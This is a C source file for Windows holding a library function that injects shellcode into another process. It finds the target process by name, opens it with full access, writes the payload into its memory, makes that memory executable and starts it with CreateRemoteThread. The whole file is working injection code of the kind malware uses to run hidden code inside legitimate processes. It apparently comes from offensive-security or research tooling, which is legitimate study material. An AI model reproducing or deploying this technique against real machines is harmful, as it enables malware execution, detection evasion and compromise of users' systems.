#include <Windows.h>
#include <tlhelp32.h>
#include "misc.h"
#include "process-injection-shellcode-lib.h"


int processInjectionShellcode(IN LPCWSTR lpszProcessName, IN PVOID pbPayload, IN SIZE_T ulPayload)
{
	HANDLE hSnapShot = NULL;
	PROCESSENTRY32 pe32 = { 0 };

	PVOID pbMem = NULL;
	SIZE_T ulBytesWritten = 0;

	BOOL bRet = FALSE;

	DWORD dwProcessId = 0;
	HANDLE hProcess = NULL;

	HANDLE hThread = NULL;

	wprintf(L"[>] Process injection: START\n");

	do
	{
		wprintf(L"\t[i] Collecting processes info... ");
		hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		if (hSnapShot == INVALID_HANDLE_VALUE)
		{
			printError(L"CreateToolhelp32Snapshot");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"\t[i] Looking for process \"%s\" PID... ", lpszProcessName);
		pe32.dwSize = sizeof(PROCESSENTRY32);

		bRet = Process32First(hSnapShot, &pe32);
		if (!bRet)
		{
			printError(L"Process32First");
			break;
		}

		do
		{
			if (wcscmp(pe32.szExeFile, lpszProcessName) == 0)
			{
				dwProcessId = pe32.th32ProcessID;
				break;
			}

			bRet = Process32Next(hSnapShot, &pe32);
		} while (bRet);

		if (dwProcessId == 0)
		{
			wprintf(L"not found\n");
			break;
		}
		wprintf(L"%d\n", dwProcessId);

		wprintf(L"\t[i] Opening process handle... ");
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
		if (hProcess == NULL)
		{
			printError(L"OpenProcess");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"\t[i] Allocating external memory for payload... ");
		pbMem = VirtualAllocEx(hProcess, NULL, ulPayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (pbMem == NULL)
		{
			printError(L"VirtualAllocEx");
			break;
		}
		wprintf(L"0x%p\n", pbMem);

		wprintf(L"\t[i] Copying payload to allocated memory... ");
		bRet = WriteProcessMemory(hProcess, pbMem, pbPayload, ulPayload, &ulBytesWritten);
		if (!bRet)
		{
			printError(L"VirtualAllocEx");
			break;
		}
		wprintf(L"done, number of bytes written: %zu\n", ulBytesWritten);

		wprintf(L"\t[i] Adding EXECUTE flag for allocated memory... ");
		DWORD dwOldProtection = NULL;

		bRet = VirtualProtectEx(hProcess, pbMem, ulPayload, PAGE_EXECUTE_READWRITE, &dwOldProtection);
		if (!bRet)
		{
			printError(L"VirtualProtect");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"\t[i] Executing payload... ");
		hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pbMem, NULL, NULL, NULL);
		if (hThread == NULL)
		{
			printError(L"CreateRemoteThread");
			break;
		}
		wprintf(L"done\n");
		
		WaitForSingleObject(hThread, 2000);

		wprintf(L"\t[i] Releasing external memory for payload... ");
		bRet = VirtualFreeEx(hProcess, pbMem, 0, MEM_RELEASE);
		if (!bRet)
		{
			printError(L"VirtualFreeEx");
			break;
		}
		wprintf(L"done\n");

	} while (FALSE);

	wprintf(L"[<] Process injection: STOP\n");

	return 0;
}